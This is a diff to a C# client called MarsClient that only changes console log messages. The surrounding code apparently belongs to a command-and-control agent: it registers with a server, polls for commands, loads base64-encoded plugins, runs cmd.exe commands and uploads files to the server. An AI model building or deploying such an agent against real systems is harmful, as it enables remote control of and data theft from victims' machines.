@@ -34,7 +34,7 @@ namespace MarsClient
                 tport = 1234;
                 tipaddress = "127.0.0.1";
                 
-                Console.WriteLine("No arguments provided, using defaults...");
+                Console.WriteLine("MarsClient> No arguments provided, using defaults...");
             }
 
             comm = new Communicator(tipaddress, tport);
@@ -50,7 +50,7 @@ namespace MarsClient
             int AgentCheckInterval = 5000;
             while (true) {
                 if(comm.errored){
-                    Console.WriteLine("Error in communication, exiting");
+                    Console.WriteLine("Communicator> Error in communication, exiting!");
                     break;
                 }
                 await comm.GetCommand();
@@ -104,9 +104,9 @@ namespace MarsClient
             HttpContent content = new StringContent(contentBody);
             (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
             if (sent) {
-                Console.WriteLine("Agent registered with server.");
+                Console.WriteLine("Communicator> Agent completed inital registration with server.");
             } else {
-                Console.WriteLine("Agent failed to register with server.");
+                Console.WriteLine("Communicator> Agent failed to register with server.");
                 this.errored = true;
             }
 
@@ -151,7 +151,7 @@ namespace MarsClient
             HttpContent content = new StringContent(contentBody);
             (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
             if (sent) {
-                Console.WriteLine("Agent recieved new command set.");
+                Console.WriteLine("Communicator> Agent successfully requested new command set.");
 
                 // parse body json into a object
                 // c# got mad when there was no class to pass this into
@@ -179,7 +179,7 @@ namespace MarsClient
                     (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
                 }
             } else {
-                Console.WriteLine("Agent failed to fetch commands.");
+                Console.WriteLine("Communicator> Agent failed to fetch commands.");
             }
             
         }
@@ -202,7 +202,7 @@ namespace MarsClient
                     if(dll_return["ExitCode"] == 0){
                         // send files API
                         if (dll_return.TryGetValue("Files", out dynamic files)) {
-                            Console.WriteLine("Sending files");
+                            Console.WriteLine("Communicator> Sending files");
                             for (int i = 0; i < files.Length; i++) 
                             {
                                 this.SendFileToServer(files[i], Path.GetFileName(files[i]));
@@ -226,7 +226,7 @@ namespace MarsClient
         private string RunPluginCommandFromBase64(string binary, string command, string[]? plugParam){
             Plugin _plugin = PluginLoader.InitializeFromBase64(binary); 
 
-            Console.WriteLine($"Plugin loaded: {_plugin.Name}");
+            Console.WriteLine($"MarsClient> Plugin loaded: {_plugin.Name}");
 
             if(_plugin == null){
                 return "Failed to load plugin. The plugin may be corrupt or not a valid plugin.";
@@ -235,7 +235,7 @@ namespace MarsClient
             IDictionary<string, dynamic> dll_return = _plugin.RunCommand(command, plugParam);
             string exit_message = dll_return["ExitMessage"];
 
-            Console.WriteLine($"Plugin invoked: {_plugin.Name}");
+            Console.WriteLine($"MarsClient> Plugin invoked: {_plugin.Name}");
             if(dll_return["ExitCode"] == 0){
                 // send files API
                 if (dll_return.TryGetValue("Files", out dynamic files)) {
@@ -245,9 +245,14 @@ namespace MarsClient
                         this.SendFileToServer(files[i], Path.GetFileName(files[i]));
                     }
                 }
+                Console.WriteLine($"MarsClient> Notifying server of successful plugin run: {_plugin.Name}");
                 return $"Plugin {_plugin.Name} ran successfully: {exit_message}";
             }else{
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"MarsClient> Notifying server of failed plugin execution: {_plugin.Name}");
+                Console.ResetColor();
                 return $"Plugin {_plugin.Name} failed to run: {exit_message}";
+                
             }
 
             return "Failed to run plugin!";
@@ -255,7 +260,7 @@ namespace MarsClient
 
         private async Task<string> ConsoleCommand(string command){
             //method to run a consolecommand and return it's result
-            Console.WriteLine($"Executing command: {command}");
+            Console.WriteLine($"MarsClient> Executing command: {command}");
             // execute command
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     startInfo.FileName = "cmd.exe";
